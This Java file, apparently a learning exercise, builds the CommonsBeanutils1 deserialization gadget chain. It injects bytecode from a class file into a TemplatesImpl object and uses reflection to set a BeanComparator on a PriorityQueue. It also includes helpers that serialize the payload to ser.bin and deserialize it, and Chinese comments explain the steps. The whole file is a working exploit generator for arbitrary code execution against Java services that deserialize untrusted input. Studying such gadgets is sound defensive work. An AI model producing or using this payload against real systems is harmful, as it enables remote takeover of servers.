package com.study;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ConstantTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CB1 {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        // 反射修改templates的值
        Class tc = templates.getClass();
        // 修改_name
        Field NameField = tc.getDeclaredField("_name");
        NameField.setAccessible(true);
        NameField.set(templates, "test"); // 赋值
        // 修改_bytecodes
        Field BytecodesField = tc.getDeclaredField("_bytecodes");
        BytecodesField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D://temp/classes/Test.class"));
        byte[][] codes = {code};
        BytecodesField.set(templates, codes);

        BeanComparator beanComparator = new BeanComparator("outputProperties");

        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(2);
        // 反射将 property 的值赋为 outputProperties 让他不要在序列化的时候就执行
        Class pc = priorityQueue.getClass();
        Field comparatorField = pc.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(priorityQueue, beanComparator);


        // 序列化
        //serialize(priorityQueue);

        // 反序列化
        //unserialize("ser.bin");
    }

    // 序列化
    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
        oos.close();
    }

    // 反序列化
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}